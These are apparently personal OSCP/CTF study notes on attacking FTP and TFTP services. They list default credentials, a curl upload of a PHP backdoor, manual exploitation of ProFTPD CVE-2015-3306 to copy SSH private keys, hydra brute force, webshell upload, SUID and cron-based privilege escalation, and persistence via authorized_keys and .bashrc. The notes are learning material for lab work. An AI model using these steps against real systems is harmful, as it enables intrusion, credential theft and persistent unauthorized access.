<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>FTP</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>FTP</h1><br/><p><h1>Background</h1></p><p>Port <strong>21</strong> by default, but it varies based on the Server SW.</p><p></p><p>Some hosts run multiple FTP servers!</p><p></p><p><h2>Default Credentials</h2></p><p>This varies based on the Server SW used (e.g. FileZilla uses a Null Session). These credentials <span style="color:#ff0000;">aren&#39;t always detected by nmap</span>.</p><p></p><p>Sometimes a host will <span style="color:#ff0000;">allow &gt;1 of the following credentials</span>, &amp; they may have <span style="color:#ff0000;">different permissions</span>!</p><p></p><p><strong>anonymous</strong>:<strong>anonymous</strong></p><p></p><p><strong>ftp</strong>:<strong>ftp</strong></p><p></p><p>Null Session</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Tip</span>: <strong>ftpuser</strong> is a common username.</p><p></p><p><h3>Null Session</h3></p><p><strong>ftp</strong> client tool will try to automatically login with credentials (your username if not otherwise specified).</p><p></p><p>Therefore, it&#39;s easiest to connect with &quot;Dumber&quot; / universal tools (i.e. <strong>nc</strong> or <strong>telnet</strong>) since they won&#39;t automatically prompt you for credentials.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Q</span>: Could you still connect using the <strong>ftp</strong> client tool if you used the following syntax? (Haven&#39;t tested it)</p><p></p><p><em>ftp &#39;ftp://&quot;&quot;:&quot;&quot;@10.10.105.177&#39;</em></p><p></p><p><h1>Upload/Download non-Text Files</h1></p><p>Uses ASCII data type by def, but this <span style="color:#ff0000;">corrupts anything that uses binary</span> data. After connecting with <em>ftp</em>, enter <em>binary</em>. This is needed for uploading things like certain webshells, and to download files like PDFs &amp; <span style="color:#ff0000;">crack the passwd</span> or <span style="color:#ff0000;">extract metadata</span> (OSCP 134)</p><p></p><p><h2>★</h2><h2>Extracting Metadata</h2></p><p>Some file formats like <strong>PDF</strong>, and image files (<strong>JPG</strong>, <strong>PNG</strong>, etc) have metadata which could contain valuable info (e.g. an <strong>Author</strong> tag containing a <span style="color:#ff0000;">Username</span>, or Fingerprinting info about target machine).</p><p></p><p><em>exiftool FILE.pdf</em></p><p></p><p><h1>Interacting with Server</h1></p><p>The <em>ftp</em> client tool has extra built-in functionality for FTP servers, but it will immediately prompt for creds after connecting to a server.</p><p></p><p>Even if you have limited perms (e.g. you connected w/o authenticating via a Null Session), you still may be able to run some cmds. This can be useful in certain situations, like to manually exploit <strong><a href="https://nvd.nist.gov/vuln/detail/CVE-2015-3306">CVE-2015-3306</a></strong> (shown below).<strong></strong></p><p><strong></strong></p><p><span style="color:#f6d32d;">★</span><span style="color:#f66151;text-decoration:underline;">Hidden Files</span>: After connecting via <strong>ftp</strong> client tool, can use<strong> ls</strong> with normal args to view hidden content (e.g. <strong>ls -la</strong>).</p><p></p><p><span style="color:#f66151;text-decoration:underline;">WARNING</span>: Sometimes the <span style="color:#e01b24;">FTP URL Syntax doesn&#39;t work</span> where the interactive login will (using the <strong>ftp</strong> client tool). For example,</p><p></p><p><em>ftp ftp://hakanftp:123adanacrack@adana.thm</em>		(Login failed with &amp; without quotes around the user &amp; passwd)</p><p></p><p><h2>★</h2><h2>Firewall Rule for Active Connection</h2><h2>★</h2></p><p>Whitelist the FTP server&#39;s IP address with a firewall rule to before connecting to it. FTP utilizes both inbound &amp; outbound traffic.</p><p></p><p><h2>ftp Client (Linux)</h2></p><p>If connecting to a port other than 21, specify it using one of the following syntaxes. You can specify a target or a target URL.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">URL Syntax</span>: You can also use multiple different protocols (e.g. <strong>ftp://, file://</strong>, <strong>http://</strong>, &amp; <strong>https://)</strong>, &amp; can optionally specify a file path.</p><p></p><p><em>ftp USER@HOST PORT</em></p><p></p><p><em>ftp ftp://anonymous:anonymous@10.10.105.177</em></p><p></p><p><h2>ftp Client (Windows)</h2></p><p>I believe the <em>ftp</em> client tool for Windows works differently than the Linux version. First run without args, &amp; then use its prompt, like-</p><p></p><p><em>ftp</em><em></em></p><p><em>open</em> IP PORT</p><p></p><p><h3>Exit without killing shell</h3></p><p><em>bye</em></p><p></p><p><h2>wget</h2></p><p><em>wget -m</em> may work for recursively fetching text files, but less reliable than manually connecting with <em>ftp</em> then <em>get</em></p><p></p><p>I believe this is the correct syntax, but it doesn&#39;t always work &amp; won&#39;t show the files you don&#39;t have the perms to exfil.</p><p></p><p><em>wget -m --user ftp_jp --password &#39;~be&lt;3@6fe1Z:2e8&#39; ftp://192.168.232.226:24621</em></p><p></p><p><h2>curl</h2></p><p><em>curl</em> can be used for uploading files to an FTP server.</p><p></p><p><em>curl -T ./simple-backdoor.php ftp://bob:&#39;PASSWD&#39;@IP/evil.php</em></p><p></p><p><h2>Exploitation</h2></p><p><h3>ProFTPD 1.3.5 (CVE-2015-3306)</h3></p><p>The mod_copy module implements SITE CPFR and SITE CPTO commands, which can be used to copy files/directories from one place to another on the server.</p><p></p><p>Any unauthenticated client can leverage these commands to copy files from any part of the filesystem to a chosen destination.</p><p></p><p>May also be able to inject strings into a file, allowing for a WebApp backdoor (See Exploit-DB. For ex, <a href="https://www.exploit-db.com/exploits/36803">36803</a>).</p><p></p><p>Depending on the context, <span style="color:#ff0000;">may only be able to manually exploit</span>.</p><p></p><p><span class="subheading">Manual Exploitation</span>: If you know the location of a file, can copy it to an accessible / useful location. For example, if you know a <span style="color:#ff0000;">user has an SSH key</span>, you can <span style="color:#ff0000;">copy it to </span>a location where it can be retrieved (to an <span style="color:#ff0000;">SMB Share</span>, <span style="color:#ff0000;">FTP location</span>, <span style="color:#ff0000;">Website subdir</span>, etc).</p><p></p><p><em>nc 10.10.72.186 21</em><em></em></p><p><em>SITE CPFR /home/kenobi/.ssh/id_rsa</em><em></em></p><p><em>SITE CPTO /var/tmp/id_rsa</em></p><p></p><p><span class="subheading">Automated Exploitation</span>:</p><p>There are automated exploitation scripts on Exploit-DB to create backdoors in a WebApp. However, they&#39;ll only work in certain contexts &amp; you&#39;ll need info like the directory used for the Web Server (which you may be able to guess / <a href="file:///usr/share/wordlists/linux_WebApp_dirs.txt">BF</a>).</p><p></p><p><a name="Edit File Perms"></a><h1>Edit File Permissions</h1></p><p>[CTF D 15]</p><p></p><p>If you upload a backdoor (e.g. a PHP file) &amp; the page is blank / useless when you navigate to it (but you don&#39;t get status code 404), then it may be because that file lacks X/ permissions.</p><p></p><p><h2>Confirm Upload</h2><h2> </h2></p><p>Confirm that you can upload files to the Web App by uploading a TXT file (e.g. <strong>file.txt</strong> which displays “test&quot; when yoy visit <strong>/file.txt</strong>).</p><p></p><p>I *think* that TXT files will always be rendered by a Web App. IDK there may be a better way to test this.</p><p></p><p><h2>Editing Permissions</h2></p><p>You can use FTP to change file permissions, but the syntax may vary depending on the FTP server (e.g. <strong>chmod 777 evil.php</strong>).</p><p></p><p>You should be able to do tis to any file that you have R/W perms over (files you upload or others you control).</p><p></p><p>Verify the changes (e.g.<strong> ls -l</strong>).</p><p></p><p><h2>Leveraging for Privilege Escalation</h2></p><p>For example, you sign into an FTP server using the <strong>hakanftp</strong> account &amp; upload a Web App backdoor payload. Since the Web Server is running under <strong>www-data</strong>, that&#39;s the account you get the Web Shell for.</p><p></p><p>However, since the FTP files belong to <strong>hakanftp</strong>, you could upload a payload with SUID permissions (<strong>chmod +s payload.sh</strong>) to get access to that account.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Note</span>: You may also be able to just sign into that account with <strong>su</strong>.</p><p></p><p><h1>Integration with other Services (WebApps)</h1></p><p>Other services (i.e <a href="Recon_+_Services--WebApp_12.html">WebApp</a>) may use FTP server to transfer &amp; store files, making FTP a potential attack vector for seemingly unrelated services.</p><p></p><p>An FTP server can be hosted out of any directory, so it may coinidentally have access to things like configuration files, giving you R/W access.</p><p></p><p><h2>Windows Authentication</h2></p><p>FTP can be config to use NTLMv2 or Kerberos.</p><p><ul><li>If it uses NTLMv2, may be able to trigger auth against Atker&#39;s machine to capture &amp; crack hash (Win 50)</li></ul></p><p><ul><li>May be able to bypass auth via PtH or with a Ticket.</li></ul></p><p></p><p><h2>Example Services</h2></p><p><h3>Web Applications</h3></p><p>An FTP server may be hosted out of the same directory that&#39;s used by a Web server. Therefore, you may be able to upload Webshell &amp; fetch it using the <a href="Recon_+_Services--WebApp_12.html">WebApp</a> to trigger shell.</p><p></p><p><span class="subheading">Other Web servers</span>: Sometimes it looks like you can access a Web App&#39;s files via FTP, but you&#39;re really viewing the files for an alternate server or subdomain.</p><p></p><p>For example, the external server is &quot;Production&quot; but the FTP server has files for the internal “Dev” server.</p><p></p><p>This means that you won&#39;t be able to trigger the Web Shell unless you access the correct server &amp;/or subdomain.</p><p></p><p>Even if you can&#39;t access the corresponding Web server, uploading a backdoor via FTP may let you execute a Client Side attack if you know that a local user will fetch the poisoned resource.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Note</span>: The backdoor file also needs X/ <a href="Recon_+_Services--FTP_13.html#Edit File Perms">permissions</a> to trigger.</p><p></p><p><h3>SSH</h3></p><p>If the FTP server is hosted out of a user&#39;s home directory, you can steal their SSH keys.</p><p></p><p>If the FTP user has the appropriate permissions, <span style="color:#ff0000;">you can make directories</span> &amp; sometimes even <span style="color:#ff0000;">change file permissions</span> (shouldn&#39;t normally be necessary for this attack vector).</p><p></p><p>This means that you can generate SSH keys on your machine, create <strong>.ssh/</strong> if necessary,<strong> </strong>&amp; upload the corresponding <strong>authorized_keys</strong> to the target machine.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Tip</span>: With access to a user&#39;s <strong>~/</strong>, you can also setup persistent access to the machine using a file like <strong>~/.bashrc</strong> or <strong>~/.bash_profile</strong> as long as the target user signs into the machine to trigger your backdoor.</p><p></p><p><h3>Scheduled Jobs (Cron)</h3></p><p>You may have access to scripts that are executed via a scheduled job (e.g. Cron). You may be able to overwrite these scripts with a malicious version.</p><p></p><p>You won&#39;t even need to give that script X/ permissions as long as it&#39;s being invoked like<strong> bash ~/script.sh</strong> or <strong>python /opt/script.py</strong> (which is the case for most scheduled jobs. It&#39;s uncommon to see a job directly executed like <strong>~/script.sh</strong>).</p><p></p><p><h1>Brute Force</h1></p><p><em>hydra -L usernames.txt -P passwds.txt -V -f 192.168.199.245 ftp</em></p><p></p><p><h1>Use SSH Key for SFTP</h1></p><p><em>sftp -i id_rsa-P 21 USER@192.168.229.245</em></p><p></p><p>sftp versions won&#39;t accept the &quot;-i&quot; so you can use the alternative-</p><p></p><p><em>sftp -oIdentityFile=&lt;privateKey.file&gt; user@example.com</em></p><p></p><p><h1>Troubleshooting</h1></p><p><h2>Unresponsive Server</h2></p><p>Some FTP servers have difficulties uploading or downloading files, even if you try to force it into Active Mode. Ensure that you&#39;ve created a <span style="color:#e01b24;">Firewall rule</span> which <span style="color:#e01b24;">Whitelists the FTP server&#39;s IP</span> address.</p><p></p><p></p><p>If the server is still unresponsive, non-interactive tools may be more reliable than the normal, interactive client tools.</p><p></p><p><h3>Download</h3></p><p>IIRC, you only need to specify the port number in the URI if the server is using something other than port 21. You should also be able to specify creds in the URI, instead of using the following parameters.</p><p></p><p><em>wget -m --user bob --password ‘PASSWD’ ftp://IP:PORT</em></p><p></p><p><h3>Upload</h3></p><p>The following example uploads the file to the Root Directory, but you can also use the path to a subdirectory.</p><p></p><p><em>curl -T ./simple-backdoor.php ftp://bob:&#39;PASSWD&#39;@IP/evil.php</em></p><p></p><p><h2>Stuck in Passive Mode</h2></p><p><strong>229 Entering Extended Passive Mode (|||50652|)</strong> when trying to perform a cmd after connecting</p><p></p><p>May be able to specify Active Mode when connecting with<em> ftp -A</em></p><p>or after connecting run <strong>passive off</strong></p><p></p><p><h1>TFTP</h1></p><p>[OSCP 36]</p><p><span style="color:#ff0000;">UDP</span> version of FTP, uses <span style="color:#ff0000;">port 69 by def</span> (nice). <a href="https://book.hacktricks.xyz/network-services-pentesting/69-udp-tftp">Hacktricks</a></p><p></p><p><h2>Enumerate Files</h2></p><p></p><p><h3>Directory Listing</h3></p><p></p><p>TFTP is a minimal file transfer protocol that does not provide subcommands to list remote files, but Tftpd32 has a <a href="https://stackoverflow.com/questions/18225182/how-to-list-the-windows-tftp-server-directories-and-files-from-command-prompt">workaround</a>; it can create a &quot;<span style="color:#ff0000;">dir.txt</span>&quot; file for the directory you&#39;re accessing. Enable the option in the TFTP settings of Tftpd32. Now when a TFTP client requests the &quot;dir.txt&quot; file, the server will generate and send a file that lists the content of the base directory.</p><p></p><p><h3>BF Contents</h3><h3> </h3>★</p><p><em>sudo nmap -n -Pn -sU -p69 -sV -v --script tftp-enum IP</em></p><p></p><p>There&#39;s also a <a href="file:///usr/share/wordlists/seclists/Discovery/Web-Content/tftp.fuzz.txt">seclists worldist</a> for tftp.</p><p></p><p><h2>Uploading &amp; Downloading</h2></p><p></p><p><h3>tftp Client Tool</h3></p><p>Haven&#39;t tried, but there&#39;s a dedicated binary for <a href="https://superuser.com/questions/581812/put-file-with-tftp-client-in-linux">tftp</a>.</p><p></p><p><h3>Python Script</h3></p><p>Accidentally deleted my python script :(</p><p></p><p>Had Chat-GPT re-write it for me, but haven&#39;t tested it.</p><p></p><p><span class="subheading">Usage</span>: <strong>/home/asura/code/python/tftp.py</strong></p><p></p><p><em>python script.py upload path/to/local/file path/to/remote/file tftp_server_ip [port]</em><em></em></p><p><em></em><em></em></p><p><em>python script.py download path/to/local/file path/to/remote/file tftp_server_ip [port]</em></p><p></p><p><strong>______OG (DELETED) SCRIPT_____</strong></p><p><a href="file:///home/asura/code/python/tftp.py">Preferable method</a>, since you can name the output files. Specify name of file to upload/download &amp; the path to find/place it on local system.</p><p>May need to retry if you get an error.</p><p></p><p><span class="subheading">Upload</span>: <em>python3 ~/code/python/tftp.py 192.168.238.226 69 u cmdasp.aspx /usr/share/webshells/aspx/cmdasp.aspx</em></p><p></p><p><span class="subheading">Download</span>:<em> python3 ~/code/python/tftp.py 192.168.232.222 69 d sip-confg /dev/shm/sip-confg</em></p><p></p><p><h3>msfconsole </h3></p><p>module<strong> admin/tftp/tftp_transfer_util</strong></p><p></p><p>Must setup Msf DB to save files using msfconsole. Exfil&#39;ed files will be viewable with <strong>loot</strong></p><p></p><p><h1>FTP Bounce Attack</h1></p><p>Not covered, so not on OSCP?</p><p></p><p><h1>Tips</h1><ul><li><strong>!</strong> is used to run cmds on local machine, not target FTP server. For ex,<strong> !whoami</strong> gets asura</li></ul></p><p><ul><li>Verify you can <span style="color:#ff0000;">write to lcd</span> before trying to download files! sudo autorecon sets perms on the created dirs too high for normal user.</li></ul></p><p><ul><li>Sometimes <strong><span style="color:#ff0000;">less</span></strong><span style="color:#ff0000;"> works even when </span><strong><span style="color:#ff0000;">get</span></strong><span style="color:#ff0000;"> doesn&#39;t</span>. <strong>get</strong> kept saying “no such file...”</li></ul></p><p><ul><li><span style="color:#ff0000;">Check metadata</span> of non-text files. Info like <strong>Author</strong> could be a username (maybe w/o capitalization).</li></ul></p><p><ul><li>Check for vuln SW! For ex, <span style="color:#ff0000;">some servers have RCE vulns</span>.</li></ul></p><p><ul><li>Even if you <span style="color:#ff0000;">already have creds</span>, <span style="color:#ff0000;">still try def creds</span>. May be diff content / perms.</li></ul></p></div>
</body>
</html>
